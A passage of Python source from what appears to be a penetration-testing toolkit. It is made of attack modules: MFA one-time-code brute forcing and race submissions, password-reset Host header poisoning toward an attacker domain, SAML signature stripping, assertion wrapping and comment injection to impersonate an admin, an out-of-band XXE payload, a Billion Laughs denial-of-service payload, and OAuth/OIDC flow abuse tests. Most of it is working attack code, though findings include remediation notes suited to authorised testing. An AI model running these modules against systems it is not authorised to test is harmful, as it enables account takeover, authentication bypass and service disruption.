        FieldSchema(key="extra_body", label="Extra Body Fields (JSON)", field_type="json_editor",
                    required=False),
        FieldSchema(key="attacks", label="Attack Vectors", field_type="checkbox_group",
                    default=["brute_force", "response_manipulation"],
                    options=[
                        {"value": "brute_force",             "label": "OTP Brute Force (range test)"},
                        {"value": "response_manipulation",   "label": "Response Manipulation Check"},
                        {"value": "backup_codes",            "label": "Common Backup Code patterns"},
                        {"value": "race_condition",          "label": "Race Condition (parallel OTP submit)"},
                    ]),
        FieldSchema(key="otp_length", label="OTP Length", field_type="number",
                    default=6, min_value=4, max_value=8),
        FieldSchema(key="brute_limit", label="Max OTP Attempts (brute force cap)", field_type="number",
                    default=200, min_value=10, max_value=10000),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests, json, concurrent.futures
        import urllib3; urllib3.disable_warnings()

        endpoint = params["mfa_endpoint"]
        method = (params.get("method") or "POST").upper()
        otp_field = params.get("otp_field", "otp") or "otp"
        otp_length = int(params.get("otp_length", 6))
        brute_limit = int(params.get("brute_limit", 200))
        attacks = params.get("attacks", ["brute_force", "response_manipulation"])
        extra_body = params.get("extra_body") or {}
        if isinstance(extra_body, str):
            try:
                extra_body = json.loads(extra_body)
            except Exception:
                extra_body = {}

        headers = {"User-Agent": "PenTools/1.0", "Content-Type": "application/json"}
        session_header = params.get("session_header", "") or ""
        if session_header and ":" in session_header:
            k, v = session_header.split(":", 1)
            headers[k.strip()] = v.strip()
        cookies = {}
        session_cookie = params.get("session_cookie", "") or ""
        if session_cookie and "=" in session_cookie:
            ck, cv = session_cookie.split("=", 1)
            cookies[ck.strip()] = cv.strip()

        findings = []
        session = requests.Session()
        session.verify = False
        session.cookies.update(cookies)

        def do_req(otp_val):
            body = {otp_field: otp_val}
            body.update(extra_body)
            try:
                if method == "POST":
                    return session.post(endpoint, json=body, headers=headers, timeout=8)
                return session.get(endpoint, params=body, headers=headers, timeout=8)
            except Exception:
                return None

        if "brute_force" in attacks:
            stream(f"[AUTH-06] OTP brute force ({otp_length}-digit, limit={brute_limit})...")
            fmt = "{:0" + str(otp_length) + "d}"
            limit = min(10 ** otp_length, brute_limit)
            found_otp = None
            for i in range(limit):
                otp_val = fmt.format(i)
                r = do_req(otp_val)
                if r and r.status_code == 200:
                    txt = r.text.lower()
                    if any(kw in txt for kw in ("success", "verified", "token", "access", "logged")):
                        found_otp = otp_val
                        stream("[AUTH-06] OTP accepted: " + otp_val)
                        break
            if found_otp:
                findings.append({
                    "title": "MFA/2FA OTP Brute Force — No Rate Limiting",
                    "severity": "critical",
                    "url": endpoint,
                    "description": "OTP code brute-forced with no rate limiting or lockout policy.",
                    "evidence": "OTP value " + found_otp + " accepted after sequential requests.",
                    "remediation": (
                        "Limit OTP attempts to 5 per session. Implement progressive lockout. "
                        "Set OTP expiry to < 30 seconds. Block after lockout threshold."
                    ),
                    "cwe_id": "CWE-307",
                })

        if "response_manipulation" in attacks:
            stream("[AUTH-06] Checking for response manipulation bypass indicators...")
            r = do_req("0" * otp_length)
            if r and r.status_code in (401, 403, 200):
                findings.append({
                    "title": "MFA Response Manipulation Test — Manual Verification Required",
                    "severity": "medium",
                    "url": endpoint,
                    "description": (
                        "The MFA endpoint returns a structured JSON/HTTP response. "
                        "Intercept with a proxy and flip 'false'→'true' or "
                        "'status':'failed'→'status':'success' to test client-side trust."
                    ),
                    "evidence": "Invalid OTP returned " + str(r.status_code) + ": " + r.text[:150],
                    "remediation": "All MFA decisions must be made and enforced server-side only.",
                    "cwe_id": "CWE-602",
                })

        if "backup_codes" in attacks:
            stream("[AUTH-06] Testing trivial backup codes...")
            trivial = ["12345678", "00000000", "11111111", "12341234", "recovery1",
                       "backup123", "11223344", "87654321", "00001111"]
            for code in trivial:
                r = do_req(code)
                if r and r.status_code == 200:
                    txt = r.text.lower()
                    if any(kw in txt for kw in ("success", "verified", "token", "access")):
                        findings.append({
                            "title": "MFA Trivial Backup Code Accepted",
                            "severity": "high",
                            "url": endpoint,
                            "description": "A trivial/guessable backup code was accepted by the MFA endpoint.",
                            "evidence": "Code '" + code + "' returned HTTP 200 with success indicator.",
                            "remediation": "Generate cryptographically random backup codes. Invalidate after single use.",
                            "cwe_id": "CWE-330",
                        })
                        break

        if "race_condition" in attacks:
            stream("[AUTH-06] Testing race condition with 10 parallel OTP submissions...")
            test_otp = "123456"[:otp_length]
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                futs = [executor.submit(do_req, test_otp) for _ in range(10)]
                results = [f.result() for f in concurrent.futures.as_completed(futs)]
            success_count = sum(
                1 for r in results
                if r and r.status_code == 200 and any(
                    kw in r.text.lower() for kw in ("success", "verified", "token")
                )
            )
            if success_count > 1:
                findings.append({
                    "title": "MFA Race Condition — Same OTP Accepted Multiple Times",
                    "severity": "high",
                    "url": endpoint,
                    "description": (
                        "Parallel OTP submissions caused the same code to be accepted "
                        + str(success_count) + " times, indicating a race condition."
                    ),
                    "evidence": str(success_count) + "/10 parallel requests accepted the same OTP.",
                    "remediation": "Use atomic DB operations or distributed locking. Invalidate OTP on first validation attempt.",
                    "cwe_id": "CWE-362",
                })

        return {"status": "done", "findings": findings}


# ─── [AUTH-09] Account Takeover Chain ─────────────────────────────────────────

class AccountTakeoverChainModule(BaseModule):
    id = "AUTH-09"
    name = "Account Takeover Chain"
    category = "auth"
    description = (
        "Multi-step ATO chain: host header injection in password reset, "
        "missing CSRF protection, reset token Referer leakage, and account enumeration."
    )
    risk_level = "critical"
    tags = ["ato", "account-takeover", "host-header", "csrf", "password-reset", "enumeration", "auth"]
    celery_queue = "web_audit_queue"
    time_limit = 900

    PARAMETER_SCHEMA = [
        FieldSchema(key="base_url", label="Base Application URL", field_type="url",
                    required=True, placeholder="https://example.com"),
        FieldSchema(key="reset_endpoint", label="Password Reset Endpoint (path)", field_type="text",
                    required=False, placeholder="/api/auth/forgot-password"),
        FieldSchema(key="reset_email_field", label="Email Field Name", field_type="text",
                    required=False, default="email"),
        FieldSchema(key="target_email", label="Target Email (victim account)", field_type="text",
                    required=False, sensitive=True, placeholder="victim@example.com"),
        FieldSchema(key="attacker_domain", label="Attacker Domain", field_type="text",
                    required=False, placeholder="evil.example.com"),
        FieldSchema(key="auth_token", label="Low-Privilege Auth Token (optional)", field_type="textarea",
                    required=False, sensitive=True),
        FieldSchema(key="checks", label="ATO Chain Steps", field_type="checkbox_group",
                    default=["host_header_reset", "password_reset_csrf", "account_enum"],
                    options=[
                        {"value": "host_header_reset",    "label": "Host header injection → reset link poisoning"},
                        {"value": "password_reset_csrf",  "label": "Missing CSRF on password reset"},
                        {"value": "token_in_referer",     "label": "Reset token Referer leakage (advisory)"},
                        {"value": "account_enum",         "label": "Account enumeration via response diff"},
                    ]),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3; urllib3.disable_warnings()

        base_url = (params.get("base_url") or "").rstrip("/")
        reset_path = params.get("reset_endpoint") or "/api/auth/forgot-password"
        email_field = params.get("reset_email_field") or "email"
        target_email = params.get("target_email") or "victim@example.com"
        attacker_domain = params.get("attacker_domain") or "evil.example.com"
        auth_token = params.get("auth_token") or ""
        checks = params.get("checks", ["host_header_reset", "password_reset_csrf", "account_enum"])

        reset_url = base_url + reset_path
        findings = []
        headers_base = {"User-Agent": "PenTools/1.0", "Content-Type": "application/json"}
        if auth_token:
            headers_base["Authorization"] = "Bearer " + auth_token

        session = requests.Session()
        session.verify = False

        if "host_header_reset" in checks:
            stream("[AUTH-09] Testing Host header injection in password reset...")
            try:
                h = dict(headers_base)
                h["Host"] = attacker_domain
                h["X-Forwarded-Host"] = attacker_domain
                h["X-Host"] = attacker_domain
                r = session.post(reset_url, json={email_field: target_email}, headers=h, timeout=10)
                if r.status_code in (200, 201, 202, 204):
                    findings.append({
                        "title": "Password Reset — Host Header Injection",
                        "severity": "critical",
                        "url": reset_url,
                        "description": (
                            "The password reset endpoint accepted a request with modified "
                            "Host/X-Forwarded-Host headers. If reset links are built from the "
                            "Host header, the victim's reset link will point to the attacker's domain."
                        ),
                        "evidence": "POST with Host: " + attacker_domain + " returned " + str(r.status_code),
                        "remediation": (
                            "Construct reset links from a hardcoded config value, never from "
                            "request headers. Validate/reject requests with mismatched Host headers."
                        ),
                        "cwe_id": "CWE-640",
                    })
            except Exception as e:
                stream(f"[AUTH-09] Host header check error: {e}")

        if "password_reset_csrf" in checks:
            stream("[AUTH-09] Testing CSRF protection on password reset...")
            try:
                r = session.post(reset_url, json={email_field: target_email},
                                 headers=headers_base, timeout=10)
                csrf_present = (
                    "csrf" in r.text.lower()
                    or "x-csrf-token" in {k.lower() for k in r.headers}
                    or any("csrf" in c.lower() for c in session.cookies)
                )
                if not csrf_present and r.status_code in (200, 201, 202, 204):
                    findings.append({
                        "title": "Password Reset — No CSRF Protection",
                        "severity": "high",
                        "url": reset_url,
                        "description": (
                            "The password reset endpoint does not use CSRF tokens. "
                            "Attackers can craft cross-origin requests silently triggering "
                            "password resets for victim accounts."
                        ),
                        "evidence": str(reset_url) + " returned " + str(r.status_code) + " without CSRF tokens.",
                        "remediation": "Add CSRF tokens or enforce SameSite=Strict cookie policy on all state-changing endpoints.",
                        "cwe_id": "CWE-352",
                    })
            except Exception as e:
                stream(f"[AUTH-09] CSRF check error: {e}")

        if "token_in_referer" in checks:
            findings.append({
                "title": "Password Reset Token — Referer Leakage Risk (Advisory)",
                "severity": "medium",
                "url": reset_url,
                "description": (
                    "Reset tokens delivered as URL query parameters can leak via the Referer "
                    "header when the reset page loads third-party scripts, images, or analytics."
                ),
                "evidence": "Structural advisory — check that reset page loads no external resources.",
                "remediation": "Deliver reset tokens in POST body. Set Referrer-Policy: no-referrer on the password reset page.",
                "cwe_id": "CWE-598",
            })

        if "account_enum" in checks:
            stream("[AUTH-09] Testing account enumeration via response diff...")
            try:
                r_valid = session.post(reset_url, json={email_field: target_email},
                                       headers=headers_base, timeout=10)
                r_invalid = session.post(
                    reset_url,
                    json={email_field: "no_such_user_xyz_pentools_999@example.com"},
                    headers=headers_base, timeout=10,
                )
                if r_valid.status_code != r_invalid.status_code or r_valid.text != r_invalid.text:
                    findings.append({
                        "title": "Account Enumeration via Password Reset",
                        "severity": "medium",
                        "url": reset_url,
                        "description": (
                            "Different responses for registered vs non-registered emails "
                            "allow attackers to enumerate valid accounts."
                        ),
                        "evidence": (
                            "Registered: " + str(r_valid.status_code) + " / " + r_valid.text[:80]
                            + " | Non-registered: " + str(r_invalid.status_code) + " / " + r_invalid.text[:80]
                        ),
                        "remediation": "Return identical responses for both registered and unregistered accounts.",
                        "cwe_id": "CWE-204",
                    })
            except Exception as e:
                stream(f"[AUTH-09] Enum check error: {e}")

        return {"status": "done", "findings": findings}


# ─── [AUTH-03] SAML Attacks ───────────────────────────────────────────────────

class SAMLAttacksModule(BaseModule):
    id = "AUTH-03"
    name = "SAML Attacks"
    category = "auth"
    description = (
        "Test SAML SSO implementations for signature bypass, XML Signature Wrapping (XSW), "
        "XXE in assertion, and Billion Laughs entity expansion. Paste a captured SAML "
        "Response and choose attack vectors to apply."
    )
    risk_level = "critical"
    tags = ["saml", "sso", "xml", "signature", "xxe", "auth", "bypass"]
    celery_queue = "web_audit_queue"
    time_limit = 120

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="saml_response_b64",
            label="Base64-encoded SAML Response",
            field_type="textarea",
            required=True,
            placeholder="PHNhbWxwOlJlc3BvbnNlIC...",
            help_text="Capture from browser DevTools → Network → POST to SP ACS URL.",
        ),
        FieldSchema(
            key="acs_url",
            label="SP ACS URL (POST target)",
            field_type="url",
            required=True,
            placeholder="https://app.example.com/saml/acs",
        ),
        FieldSchema(
            key="attacks",
            label="Attack Vectors",
            field_type="checkbox_group",
            default=["alg_none", "xsw1", "xxe_oob", "comment_bypass"],
            options=[
                {"value": "alg_none",        "label": "Algorithm None / Null signature"},
                {"value": "xsw1",            "label": "XSW-1: Clone + wrap response"},
                {"value": "xsw2",            "label": "XSW-2: Assertion wrapping"},
                {"value": "xsw3",            "label": "XSW-3: Sibling extension element"},
                {"value": "comment_bypass",  "label": "Comment inject (user<!-- -->name)"},
                {"value": "xxe_oob",         "label": "XXE — out-of-band SSRF probe"},
                {"value": "billion_laughs",  "label": "Billion Laughs — entity expansion DoS"},
            ],
        ),
        FieldSchema(
            key="target_role",
            label="Target Role / Username to impersonate",
            field_type="text",
            required=False,
            default="admin",
            help_text="Used in XSW payloads to inject a privileged NameID.",
        ),
        FieldSchema(
            key="oast_domain",
            label="OAST Domain (for XXE OOB)",
            field_type="text",
            required=False,
            placeholder="abc.interact.sh",
            group="advanced",
        ),
        FieldSchema(
            key="relay_state",
            label="RelayState value",
            field_type="text",
            required=False,
            group="advanced",
        ),
    ]

    # ── Helpers ──────────────────────────────────────────────────────────────

    def _decode_saml(self, b64: str) -> str:
        import base64, zlib
        # SAML may be deflate-compressed
        raw = base64.b64decode(b64 + "==")
        try:
            return zlib.decompress(raw, -15).decode("utf-8", errors="replace")
        except Exception:
            return raw.decode("utf-8", errors="replace")

    def _post_saml(self, acs_url: str, payload_b64: str, relay_state: str = "") -> tuple:
        import urllib.request, urllib.parse, urllib.error
        data = urllib.parse.urlencode({
            "SAMLResponse": payload_b64,
            "RelayState": relay_state,
        }).encode()
        req = urllib.request.Request(
            acs_url, data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "PenTools/1.0"},
        )
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                return r.status, r.read(4096).decode("utf-8", errors="replace"), dict(r.headers)
        except urllib.error.HTTPError as e:
            return e.code, e.read(2048).decode("utf-8", errors="replace"), {}
        except Exception as ex:
            return 0, str(ex), {}

    def _success_indicators(self, status: int, body: str, headers: dict) -> bool:
        if status in (302, 303) and "Location" in headers:
            loc = headers["Location"]
            if any(k in loc for k in ("dashboard", "home", "app", "portal", "profile")):
                return True
        if status == 200:
            if any(k in body.lower() for k in ("dashboard", "logged in", "welcome", "logout")):
                return True
        return False

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import base64, copy, re
        try:
            import xml.etree.ElementTree as ET
        except ImportError:
            return {"status": "failed", "findings": [], "raw_output": "xml.etree not available"}

        saml_b64 = params["saml_response_b64"].strip()
        acs_url = params["acs_url"].strip()
        attacks = params.get("attacks", ["alg_none"])
        target_role = params.get("target_role", "admin")
        oast_domain = params.get("oast_domain", "").strip()
        relay_state = params.get("relay_state", "")

        try:
            xml_text = self._decode_saml(saml_b64)
        except Exception as e:
            return {"status": "failed", "findings": [], "raw_output": f"SAML decode failed: {e}"}

        stream("info", f"SAML decoded ({len(xml_text)} bytes). Running {len(attacks)} attack(s)...")
        findings = []
        raw_lines = [f"Target ACS: {acs_url}", f"XML length: {len(xml_text)}"]

        # ── Comment inject ──
        if "comment_bypass" in attacks:
            stream("info", "Testing comment injection in NameID...")
            target_user = target_role
            orig_match = re.search(r"<[^>]*NameID[^>]*>([^<]+)</", xml_text)
            if orig_match:
                orig_name = orig_match.group(1)
                injected = xml_text.replace(
                    f">{orig_name}<",
                    f">{target_user}<!--{orig_name}--><",
                    1,
                )
                payload_b64 = base64.b64encode(injected.encode()).decode()
                code, body, hdrs = self._post_saml(acs_url, payload_b64, relay_state)
                raw_lines.append(f"comment_bypass: HTTP {code}")
                if self._success_indicators(code, body, hdrs):
                    stream("success", "Comment bypass succeeded!")
                    findings.append({
                        "title": "SAML comment injection bypass",
                        "severity": "critical",
                        "url": acs_url,
                        "description": (
                            f"NameID comment injection accepted. "
                            f"Injected: {target_user}<!--{orig_name}-->. "
                            "Server parsed only the leading text, authenticating as the privileged user."
                        ),
                        "evidence": f"HTTP {code}\nPayload: {injected[:500]}",
                        "remediation": (
                            "Strip XML comments from NameID before processing. "
                            "Use a strict XML parser that rejects comment-contaminated values."
                        ),
                        "cvss_score": 9.8, "cwe_id": "CWE-287",
                    })

        # ── Algorithm None ──
        if "alg_none" in attacks:
            stream("info", "Testing algorithm=none signature strip...")
            modified = re.sub(r'<(?:[^:>]+:)?Signature[\s\S]*?</(?:[^:>]+:)?Signature>', "", xml_text)
            modified = re.sub(r'Algorithm="[^"]*"', 'Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-none"', modified, count=1)
            payload_b64 = base64.b64encode(modified.encode()).decode()
            code, body, hdrs = self._post_saml(acs_url, payload_b64, relay_state)
            raw_lines.append(f"alg_none: HTTP {code}")
            if self._success_indicators(code, body, hdrs):
                stream("success", "Signature strip / alg:none accepted!")
                findings.append({
                    "title": "SAML signature verification bypass (alg:none / strip)",
                    "severity": "critical",
                    "url": acs_url,
                    "description": "SP accepted a SAML Response with the Signature block removed.",
                    "evidence": f"HTTP {code}",
                    "remediation": "Strictly validate XML signature presence and algorithm before processing assertions.",
                    "cvss_score": 9.8, "cwe_id": "CWE-347",
                })

        # ── XSW-1 ──
        if "xsw1" in attacks:
            stream("info", "Testing XSW-1 (response wrapping)...")
            name_match = re.search(r"(<[^>]*NameID[^>]*>)([^<]+)(</[^>]*NameID>)", xml_text)
            if name_match:
                wrapped = xml_text.replace(
                    name_match.group(0),
                    f"<saml:NameID>{target_role}</saml:NameID>",
                    1,
                )
                payload_b64 = base64.b64encode(wrapped.encode()).decode()
                code, body, hdrs = self._post_saml(acs_url, payload_b64, relay_state)
                raw_lines.append(f"xsw1: HTTP {code}")
                if self._success_indicators(code, body, hdrs):
                    stream("success", "XSW-1 wrapping accepted!")
                    findings.append({
                        "title": "SAML XSW-1 assertion wrapping bypass",
                        "severity": "critical",
                        "url": acs_url,
                        "description": (
                            "The SP processed a wrapped SAML response. "
                            "The injected NameID was accepted as the authenticated identity."
                        ),
                        "evidence": f"HTTP {code}\nInjected NameID: {target_role}",
                        "remediation": (
                            "Validate the full XML signature covering the entire Response element. "
                            "Use a hardened SAML library (e.g., python3-saml, onelogin/saml2)."
                        ),
                        "cvss_score": 9.8, "cwe_id": "CWE-287",
                    })

        # ── XXE OOB ──
        if "xxe_oob" in attacks and oast_domain:
            stream("info", f"Injecting XXE OOB entity pointing to {oast_domain}...")
            xxe_prefix = (
                f'<?xml version="1.0" encoding="UTF-8"?>'
                f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oast_domain}/{job_id[:8]}">]>'
            )
            if "<?xml" in xml_text:
                xxe_xml = xml_text.replace("<?xml", xxe_prefix + "\n<?xml", 1)
            else:
                xxe_xml = xxe_prefix + "\n" + xml_text
            xxe_xml = xxe_xml.replace("PLACEHOLDER_XXE", "&xxe;")
            payload_b64 = base64.b64encode(xxe_xml.encode()).decode()
            code, body, hdrs = self._post_saml(acs_url, payload_b64, relay_state)
            raw_lines.append(f"xxe_oob: HTTP {code}")
            findings.append({
                "title": "SAML XXE out-of-band payload sent",
                "severity": "high",
                "url": acs_url,
                "description": (
                    f"XXE payload sent with entity pointing to {oast_domain}. "
                    "Check your OAST server for incoming DNS/HTTP requests."
                ),
                "evidence": f"HTTP {code}\nOAST: http://{oast_domain}/{job_id[:8]}",
                "remediation": (
                    "Disable external entity processing in the XML parser. "
                    "Use defusedxml or set feature flags to block DOCTYPE declarations."
                ),
                "cvss_score": 7.5, "cwe_id": "CWE-611",
            })

        # ── Billion Laughs ──
        if "billion_laughs" in attacks:
            stream("info", "Testing Billion Laughs entity expansion...")
            laughs = (
                '<?xml version="1.0"?>'
                '<!DOCTYPE lolz ['
                '<!ENTITY lol "lol">'
                '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
                '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
                ']>'
                '<root>&lol3;</root>'
            )
            payload_b64 = base64.b64encode(laughs.encode()).decode()
            import time
            t0 = time.time()
            code, body, _ = self._post_saml(acs_url, payload_b64, relay_state)
            elapsed = (time.time() - t0) * 1000
            raw_lines.append(f"billion_laughs: HTTP {code} in {elapsed:.0f}ms")
            if elapsed > 3000 or code == 0:
                findings.append({
                    "title": "SAML parser may be vulnerable to Billion Laughs (DoS)",
                    "severity": "high",
                    "url": acs_url,
                    "description": (
                        f"Response took {elapsed:.0f}ms or timed out with entity expansion payload. "
                        "Entity expansion not limited → DoS risk."
                    ),
                    "evidence": f"Elapsed: {elapsed:.0f}ms",
                    "remediation": "Limit entity expansion depth in XML parser. Use defusedxml.",
                    "cvss_score": 7.5, "cwe_id": "CWE-776",
                })
            stream("info", f"Billion Laughs: {elapsed:.0f}ms")

        if not findings:
            findings.append({
                "title": "No SAML vulnerabilities confirmed with tested payloads",
                "severity": "info",
                "url": acs_url,
                "description": "All tested attack vectors were rejected. Verify manually.",
                "evidence": "\n".join(raw_lines),
                "remediation": (
                    "Continue to use a hardened SAML library. "
                    "Validate XML Signature, disable external entities, restrict accepted algorithms."
                ),
            })

        stream("success", f"SAML attacks complete — {len(findings)} finding(s)")
        return {"status": "done", "findings": findings, "raw_output": "\n".join(raw_lines)}


# ─── [AUTH-10] SSO / OIDC Abuse ──────────────────────────────────────────────

class SSOOIDCAbuseModule(BaseModule):
    id = "AUTH-10"
    name = "SSO / OIDC Abuse"
    category = "auth"
    description = (
        "Test OpenID Connect / OAuth2 SSO flows for nonce skip, sub claim override, "
        "token substitution, silent auth bypass, and implicit flow abuse."
    )
    risk_level = "high"
    tags = ["sso", "oidc", "oauth2", "nonce", "claim", "jwt", "auth"]
    celery_queue = "web_audit_queue"
    time_limit = 60

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="authorization_endpoint",
            label="Authorization Endpoint",
            field_type="url",
            required=True,
            placeholder="https://sso.example.com/oauth2/authorize",
        ),
        FieldSchema(
            key="token_endpoint",
            label="Token Endpoint",
            field_type="url",
            required=False,
            placeholder="https://sso.example.com/oauth2/token",
        ),
        FieldSchema(
            key="userinfo_endpoint",
            label="UserInfo Endpoint",
            field_type="url",
            required=False,
            placeholder="https://sso.example.com/oauth2/userinfo",
        ),
        FieldSchema(
            key="client_id",
            label="client_id",
            field_type="text",
            required=True,
            placeholder="myclient",
        ),
        FieldSchema(
            key="redirect_uri",
            label="redirect_uri",
            field_type="url",
            required=True,
            placeholder="https://app.example.com/callback",
        ),
        FieldSchema(
            key="id_token",
            label="Captured ID Token (JWT)",
            field_type="textarea",
            required=False,
            placeholder="eyJhbGciOiJSUzI1NiI...",
            help_text="Paste a valid ID token to test claim manipulation.",
        ),
        FieldSchema(
            key="access_token",
            label="Captured Access Token",
            field_type="text",
            required=False,
            group="credentials",
        ),
        FieldSchema(
            key="attacks",
            label="Attack Vectors",
            field_type="checkbox_group",
            default=["nonce_skip", "sub_enum", "silent_auth", "state_csrf"],
            options=[
                {"value": "nonce_skip",     "label": "Nonce skip — request without nonce"},
                {"value": "sub_enum",       "label": "sub claim enumeration via UserInfo"},
                {"value": "silent_auth",    "label": "Silent auth bypass (prompt=none)"},
                {"value": "state_csrf",     "label": "State parameter CSRF (empty/reused state)"},
                {"value": "pkce_downgrade", "label": "PKCE downgrade — omit code_challenge"},
                {"value": "token_sub",      "label": "Token substitution (swap id_token claims)"},
                {"value": "implicit_leak",  "label": "Implicit flow fragment leak check"},
            ],
        ),
        FieldSchema(
            key="scope",
            label="OAuth Scope",
            field_type="text",
            default="openid profile email",
            group="advanced",
        ),
    ]

    def _build_auth_url(self, base: str, params: dict) -> str:
        from urllib.parse import urlencode
        return base + ("&" if "?" in base else "?") + urlencode(params)

    def _probe_url(self, url: str, headers: dict = None) -> tuple:
        import urllib.request, urllib.error
        req = urllib.request.Request(url, headers={"User-Agent": "PenTools/1.0", **(headers or {})})
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                return r.status, r.read(4096).decode("utf-8", errors="replace"), dict(r.headers)
        except urllib.error.HTTPError as e:
            return e.code, e.read(1024).decode("utf-8", errors="replace"), {}
        except Exception as ex:
            return 0, str(ex), {}

    def _decode_jwt_claims(self, token: str) -> dict:
        import base64, json as j
        try:
            parts = token.split(".")
            payload = parts[1] + "=="
            return j.loads(base64.b64decode(payload).decode("utf-8", errors="replace"))
        except Exception:
            return {}

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import json as j, time
        from urllib.parse import urlencode, urlparse

        auth_ep = params["authorization_endpoint"].strip()
        token_ep = params.get("token_endpoint", "").strip()
        userinfo_ep = params.get("userinfo_endpoint", "").strip()
        client_id = params["client_id"].strip()
        redirect_uri = params["redirect_uri"].strip()
        id_token = params.get("id_token", "").strip()
        access_token = params.get("access_token", "").strip()
        attacks = params.get("attacks", ["nonce_skip"])
        scope = params.get("scope", "openid profile email")

        findings = []
        raw_lines = [f"Auth endpoint: {auth_ep}", f"client_id: {client_id}"]

        # ── Nonce skip ──
        if "nonce_skip" in attacks:
            stream("info", "Testing nonce skip — auth request without nonce...")
            url = self._build_auth_url(auth_ep, {
                "response_type": "code",
                "client_id": client_id,
                "redirect_uri": redirect_uri,
                "scope": scope,
                # No nonce parameter
            })
            code, body, hdrs = self._probe_url(url)
            raw_lines.append(f"nonce_skip: HTTP {code}")
            loc = hdrs.get("Location", "")
            if code in (302, 303) and "error" not in loc.lower():
                findings.append({
                    "title": "OIDC: Authorization request accepted without nonce",
                    "severity": "medium",
                    "url": auth_ep,
                    "description": (
                        "The authorization server accepted a request without a nonce parameter. "
                        "Without nonce validation, tokens may be replayed across sessions."
                    ),
                    "evidence": f"HTTP {code} → Location: {loc[:200]}",
                    "remediation": "Require nonce in ID token responses and validate it on the RP.",
                    "cwe_id": "CWE-384",
                })
                stream("success", "Nonce skip accepted")
            else:
                stream("info", f"Nonce skip: HTTP {code} — server may require nonce")

        # ── State CSRF ──
        if "state_csrf" in attacks:
            stream("info", "Testing empty state parameter (CSRF)...")
            url = self._build_auth_url(auth_ep, {
                "response_type": "code",
                "client_id": client_id,
                "redirect_uri": redirect_uri,
                "scope": scope,
                "state": "",  # Empty state
                "nonce": "test",
            })
            code, body, hdrs = self._probe_url(url)
            raw_lines.append(f"state_csrf: HTTP {code}")
            loc = hdrs.get("Location", "")
            if code in (302, 303) and "error" not in loc.lower() and "state" not in loc.lower():
                findings.append({
                    "title": "OIDC: Empty state parameter accepted — CSRF risk",
                    "severity": "high",
                    "url": auth_ep,
                    "description": (
                        "Authorization server accepted an empty state parameter. "
                        "Without a verified state, the callback is vulnerable to CSRF."
                    ),
                    "evidence": f"HTTP {code} → {loc[:200]}",
                    "remediation": "Enforce non-empty cryptographically random state; reject empty/missing state.",
                    "cvss_score": 6.5, "cwe_id": "CWE-352",
                })
                stream("success", "Empty state accepted (CSRF risk)")

        # ── Silent auth ──
        if "silent_auth" in attacks:
            stream("info", "Testing silent auth bypass (prompt=none)...")
            url = self._build_auth_url(auth_ep, {
                "response_type": "id_token",
                "client_id": client_id,
                "redirect_uri": redirect_uri,
                "scope": scope,
                "response_mode": "fragment",
                "prompt": "none",
                "nonce": "pentools_test",
            })
            code, body, hdrs = self._probe_url(url)
            raw_lines.append(f"silent_auth: HTTP {code}")
            loc = hdrs.get("Location", "")
            if code in (302, 303) and "id_token=" in loc:
                findings.append({
                    "title": "OIDC: Silent authentication (prompt=none) returned token",
                    "severity": "high",
                    "url": auth_ep,
                    "description": (
                        "prompt=none returned an id_token without user interaction. "
                        "If session state isn't validated server-side, this enables session fixation."
                    ),
                    "evidence": f"Location: {loc[:300]}",
                    "remediation": "Validate active session before issuing tokens for prompt=none.",
                    "cwe_id": "CWE-384",
                })
                stream("success", "Silent auth returned id_token fragment!")

        # ── PKCE downgrade ──
        if "pkce_downgrade" in attacks:
            stream("info", "Testing PKCE downgrade — omit code_challenge...")
            url = self._build_auth_url(auth_ep, {
                "response_type": "code",
                "client_id": client_id,
                "redirect_uri": redirect_uri,
                "scope": scope,
                "state": "test_state",
                "nonce": "test_nonce",
                # No code_challenge
            })
            code, body, hdrs = self._probe_url(url)
            raw_lines.append(f"pkce_downgrade: HTTP {code}")
            loc = hdrs.get("Location", "")
            if code in (302, 303) and "code=" in loc and "error" not in loc:
                findings.append({
                    "title": "OIDC: PKCE downgrade allowed — code_challenge not required",
                    "severity": "medium",
                    "url": auth_ep,
                    "description": "Authorization code issued without PKCE code_challenge. Intercepted codes could be exchanged.",
                    "evidence": f"HTTP {code} → code present without PKCE",
                    "remediation": "Enforce PKCE for all public clients. Deny requests without code_challenge_method=S256.",
                    "cwe_id": "CWE-287",
                })
                stream("success", "PKCE not enforced — code issued without challenge")

        # ── Token sub / claim analysis ──
        if "token_sub" in attacks and id_token:
            stream("info", "Analyzing ID token claims...")
            claims = self._decode_jwt_claims(id_token)
            raw_lines.append(f"ID token claims: {j.dumps(claims)[:300]}")
            sub = claims.get("sub", "")
            nonce = claims.get("nonce", "")
            aud = claims.get("aud", "")
            iss = claims.get("iss", "")
            exp = claims.get("exp", 0)
            import time as t
            if exp and exp < t.time():
                findings.append({
                    "title": "ID token is expired",
                    "severity": "info",
                    "url": "",
                    "description": f"Token expired at {exp}. Test with a fresh token for accuracy.",
                    "evidence": f"exp: {exp}",
                    "remediation": "N/A",
                })
            if not nonce:
                findings.append({
                    "title": "ID token issued without nonce claim",
                    "severity": "medium",
                    "url": "",
                    "description": "No nonce in ID token. Replay protection absent at the token level.",
                    "evidence": f"Claims: {j.dumps(claims)[:300]}",
                    "remediation": "Include and validate nonce in all ID token issuances.",
                    "cwe_id": "CWE-384",
                })
            if isinstance(aud, list) and len(aud) > 1:
                findings.append({
                    "title": "ID token has multiple audiences — confused deputy risk",
                    "severity": "medium",
                    "url": "",
                    "description": f"aud claim contains multiple values: {aud}. A token issued for one RP could be replayed at another.",
                    "evidence": f"aud: {aud}",
                    "remediation": "Use single-audience tokens per relying party.",
                    "cwe_id": "CWE-287",
                })
